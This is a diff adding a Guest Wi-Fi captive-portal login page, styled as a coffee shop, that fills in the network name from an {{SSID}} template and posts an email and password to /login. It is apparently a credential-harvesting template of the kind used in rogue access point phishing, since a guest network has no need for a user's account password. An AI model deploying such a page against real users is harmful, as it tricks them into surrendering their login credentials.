@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Guest Wi-Fi</title>
+<style>
+*{box-sizing:border-box;font-family:Georgia,'Times New Roman',serif}
+body{margin:0;background:#3b2a21;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
+.card{width:380px;max-width:94vw;background:#fffaf4;border-radius:10px;padding:32px 28px;box-shadow:0 8px 24px rgba(0,0,0,.3);text-align:center}
+.cup{width:52px;height:52px;margin:0 auto 10px;fill:#6f4e37}
+h1{font-size:24px;color:#3b2a21;margin:0 0 4px}
+.sub{font-family:Arial,sans-serif;color:#8a7a6d;font-size:13px;margin:0 0 22px}
+label{display:block;text-align:left;font-family:Arial,sans-serif;font-size:12px;color:#7a6a5d;margin:12px 0 5px}
+input{width:100%;padding:12px;border:1px solid #d9cec2;border-radius:6px;font-size:15px;font-family:Arial,sans-serif;background:#fff}
+input:focus{outline:none;border-color:#6f4e37}
+button{width:100%;margin-top:20px;padding:13px;border:0;border-radius:6px;background:#6f4e37;color:#fff;font-size:15px;font-family:Arial,sans-serif;font-weight:700;cursor:pointer}
+</style></head><body>
+<form class="card" method="POST" action="/login">
+<svg class="cup" viewBox="0 0 24 24"><path d="M4 3h13v6a5 5 0 0 1-5 5H9a5 5 0 0 1-5-5V3zm13 2v3a3 3 0 0 0 0-3zM3 19h17v2H3z"/></svg>
+<h1>Guest Wi-Fi</h1>
+<p class="sub">Sign in to reach <b>{{SSID}}</b> while you enjoy your coffee.</p>
+<label>Email</label>
+<input name="email" type="email" autocomplete="username" placeholder="Your email" required>
+<label>Password</label>
+<input name="password" type="password" autocomplete="current-password" placeholder="Your password" required>
+<button type="submit">Get online</button>
+</form></body></html>
